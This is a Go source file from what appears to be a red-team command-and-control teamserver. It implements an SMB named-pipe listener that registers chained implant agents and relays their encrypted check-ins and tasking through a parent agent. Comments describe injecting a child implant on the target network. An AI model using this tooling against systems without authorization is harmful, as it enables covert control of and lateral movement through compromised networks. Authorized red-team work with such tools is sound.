package listener

import (
	"encoding/json"
	"fmt"
	"sync"

	"github.com/redteamleaders/rtlc2/teamserver/internal/agent"
	"github.com/redteamleaders/rtlc2/teamserver/internal/crypto"
	log "github.com/sirupsen/logrus"
)

// SMBChildInfo tracks an SMB child agent and its relationship to a parent.
type SMBChildInfo struct {
	ChildAgentID  string
	ParentAgentID string
	PipeName      string
}

// SMBListener implements a named pipe listener for agent-to-agent chaining.
//
// Since SMB named pipes are a Windows-only construct, the teamserver cannot
// directly create or listen on a named pipe. Instead, this listener acts as a
// routing proxy: a parent HTTP agent that already has a connection to the
// teamserver will relay data between the teamserver and SMB child agents that
// communicate over a named pipe on the target network.
//
// Flow:
//  1. Operator instructs parent agent to spawn an SMB child (link command).
//  2. Parent agent creates a named pipe, injects the child implant, and the
//     child connects back over the pipe.
//  3. Parent agent relays child registration to teamserver via its HTTP channel.
//  4. Teamserver routes tasking for the child back through the parent agent.
type SMBListener struct {
	config       *Config
	agentManager *agent.Manager
	cipher       *crypto.AESCipher

	// pipeName is the default named pipe path used by child agents (e.g. \\.\pipe\rtlpipe).
	pipeName string

	// running indicates whether this listener is actively routing traffic.
	running bool

	// children maps child agent IDs to their routing metadata.
	children map[string]*SMBChildInfo

	mu sync.RWMutex
}

// NewSMBListener creates a new SMB named pipe routing listener.
func NewSMBListener(cfg *Config, am *agent.Manager, cipher *crypto.AESCipher) *SMBListener {
	pipeName := `\\.\pipe\rtlpipe`
	if name, ok := cfg.Options["pipe_name"]; ok && name != "" {
		pipeName = name
	}

	return &SMBListener{
		config:       cfg,
		agentManager: am,
		cipher:       cipher,
		pipeName:     pipeName,
		children:     make(map[string]*SMBChildInfo),
	}
}

func (l *SMBListener) Start() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if l.running {
		return fmt.Errorf("SMB listener %s is already running", l.config.ID)
	}

	l.running = true
	log.WithFields(log.Fields{
		"id":        l.config.ID,
		"name":      l.config.Name,
		"pipe_name": l.pipeName,
	}).Info("SMB routing listener started")

	return nil
}

func (l *SMBListener) Stop() error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if !l.running {
		return fmt.Errorf("SMB listener %s is not running", l.config.ID)
	}

	l.running = false
	log.Infof("SMB routing listener stopped: %s", l.config.ID)
	return nil
}

func (l *SMBListener) ID() string       { return l.config.ID }
func (l *SMBListener) Name() string     { return l.config.Name }
func (l *SMBListener) Protocol() int    { return ProtoSMB }
func (l *SMBListener) Address() string  { return l.pipeName }

// LinkChild registers a child agent as being routed through a parent agent
// over the given named pipe.
func (l *SMBListener) LinkChild(childAgentID, parentAgentID, pipeName string) error {
	l.mu.Lock()
	defer l.mu.Unlock()

	if !l.running {
		return fmt.Errorf("SMB listener %s is not running", l.config.ID)
	}

	l.children[childAgentID] = &SMBChildInfo{
		ChildAgentID:  childAgentID,
		ParentAgentID: parentAgentID,
		PipeName:      pipeName,
	}

	log.WithFields(log.Fields{
		"child":  childAgentID,
		"parent": parentAgentID,
		"pipe":   pipeName,
	}).Info("SMB child agent linked")

	return nil
}

// UnlinkChild removes a child agent from the routing table.
func (l *SMBListener) UnlinkChild(childAgentID string) {
	l.mu.Lock()
	defer l.mu.Unlock()

	delete(l.children, childAgentID)
	log.Infof("SMB child agent unlinked: %s", childAgentID)
}

// GetParent returns the parent agent ID for a given child, or empty string if
// the child is not registered.
func (l *SMBListener) GetParent(childAgentID string) (string, bool) {
	l.mu.RLock()
	defer l.mu.RUnlock()

	info, ok := l.children[childAgentID]
	if !ok {
		return "", false
	}
	return info.ParentAgentID, true
}

// GetChildren returns all child agent IDs routed through the given parent.
func (l *SMBListener) GetChildren(parentAgentID string) []string {
	l.mu.RLock()
	defer l.mu.RUnlock()

	var children []string
	for _, info := range l.children {
		if info.ParentAgentID == parentAgentID {
			children = append(children, info.ChildAgentID)
		}
	}
	return children
}

// HandleRelayedRegistration processes a child agent registration that was
// relayed by a parent HTTP agent. The parent forwards the encrypted
// registration blob it received from the child over the named pipe.
func (l *SMBListener) HandleRelayedRegistration(parentAgentID string, encryptedData []byte) ([]byte, error) {
	l.mu.RLock()
	running := l.running
	l.mu.RUnlock()

	if !running {
		return nil, fmt.Errorf("SMB listener %s is not running", l.config.ID)
	}

	// Decrypt with master key (child uses the same pre-shared key for initial registration)
	decrypted, err := l.cipher.Decrypt(encryptedData)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt relayed registration: %w", err)
	}

	var req agent.RegistrationRequest
	if err := json.Unmarshal(decrypted, &req); err != nil {
		return nil, fmt.Errorf("failed to unmarshal relayed registration: %w", err)
	}

	// Register the child agent (external IP comes from the parent's perspective)
	parentInfo, err := l.agentManager.GetAgent(parentAgentID)
	if err != nil {
		return nil, fmt.Errorf("parent agent %s not found: %w", parentAgentID, err)
	}

	resp, err := l.agentManager.Register(&req, parentInfo.ExternalIP, l.config.ID)
	if err != nil {
		return nil, fmt.Errorf("child agent registration failed: %w", err)
	}

	// Track the child-parent relationship
	if err := l.LinkChild(resp.AgentID, parentAgentID, l.pipeName); err != nil {
		log.Warnf("Failed to link child agent: %v", err)
	}

	// Encrypt response for relay back to child
	respData, _ := json.Marshal(resp)
	encrypted, err := l.cipher.Encrypt(respData)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt registration response: %w", err)
	}

	return encrypted, nil
}

// HandleRelayedCheckin processes a child agent check-in that was relayed
// by a parent HTTP agent.
func (l *SMBListener) HandleRelayedCheckin(parentAgentID string, data []byte) ([]byte, error) {
	l.mu.RLock()
	running := l.running
	l.mu.RUnlock()

	if !running {
		return nil, fmt.Errorf("SMB listener %s is not running", l.config.ID)
	}

	// The first 8 bytes are the child agent ID
	if len(data) < 9 {
		return nil, fmt.Errorf("relayed checkin data too short")
	}

	agentID := string(data[:8])
	encryptedPayload := data[8:]

	// Verify this child is linked to the claimed parent
	actualParent, linked := l.GetParent(agentID)
	if !linked {
		return nil, fmt.Errorf("agent %s is not a known SMB child", agentID)
	}
	if actualParent != parentAgentID {
		return nil, fmt.Errorf("agent %s parent mismatch: expected %s, got %s", agentID, actualParent, parentAgentID)
	}

	// Get session cipher for the child agent
	sessionCipher, err := l.agentManager.GetSessionCipher(agentID)
	if err != nil {
		return nil, fmt.Errorf("session cipher not found for child %s: %w", agentID, err)
	}

	// Decrypt with session key
	decrypted, err := sessionCipher.Decrypt(encryptedPayload)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt relayed checkin from %s: %w", agentID, err)
	}

	var req agent.CheckinRequest
	if err := json.Unmarshal(decrypted, &req); err != nil {
		return nil, fmt.Errorf("failed to unmarshal relayed checkin: %w", err)
	}
	req.AgentID = agentID

	// Get external IP from parent agent
	parentInfo, _ := l.agentManager.GetAgent(parentAgentID)
	clientIP := "127.0.0.1"
	if parentInfo != nil {
		clientIP = parentInfo.ExternalIP
	}

	resp, err := l.agentManager.Checkin(&req, clientIP)
	if err != nil {
		return nil, fmt.Errorf("child agent checkin failed: %w", err)
	}

	// Encrypt response with session key
	respData, _ := json.Marshal(resp)
	encrypted, err := sessionCipher.Encrypt(respData)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt checkin response: %w", err)
	}

	return encrypted, nil
}

// ListChildren returns a snapshot of all tracked SMB child relationships.
func (l *SMBListener) ListChildren() []*SMBChildInfo {
	l.mu.RLock()
	defer l.mu.RUnlock()

	result := make([]*SMBChildInfo, 0, len(l.children))
	for _, info := range l.children {
		cp := *info
		result = append(result, &cp)
	}
	return result
}
